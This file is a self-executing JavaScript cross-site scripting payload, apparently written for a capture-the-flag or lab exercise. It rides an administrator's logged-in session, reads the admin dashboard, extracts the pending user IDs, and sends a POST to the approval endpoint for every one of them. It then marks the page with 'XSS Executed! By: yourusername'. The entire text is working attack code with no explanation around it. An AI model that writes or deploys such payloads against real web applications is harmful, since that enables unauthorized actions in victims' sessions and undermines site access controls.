(function() {
        fetch('/admin/dashboard', {
            method: 'GET',
            credentials: 'include'
        })
        .then(response => response.text())
        .then(data => {
            var parser = new DOMParser();
            var doc = parser.parseFromString(data, 'text/html');
            var userIds = [];
            var forms = doc.querySelectorAll('form[action^="/admin/approve/"]');
            forms.forEach(form => {
                var action = form.getAttribute('action');
                var userId = action.split('/admin/approve/')[1];
                if (userId) userIds.push(userId);
            });

            userIds.forEach(userId => {
                fetch('/admin/approve/' + userId, {
                    method: 'POST',
                    credentials: 'include'
                })
                .then(() => console.log('Approved userId: ' + userId))
                .catch(error => console.error('Error:', error));
            });

            document.body.innerHTML += '<h1>XSS Executed! By: yourusername</h1>';
            console.log('XSS executed! Sent POST to approve userIds:', userIds);
        })
        .catch(error => console.error('Error:', error));
    })();
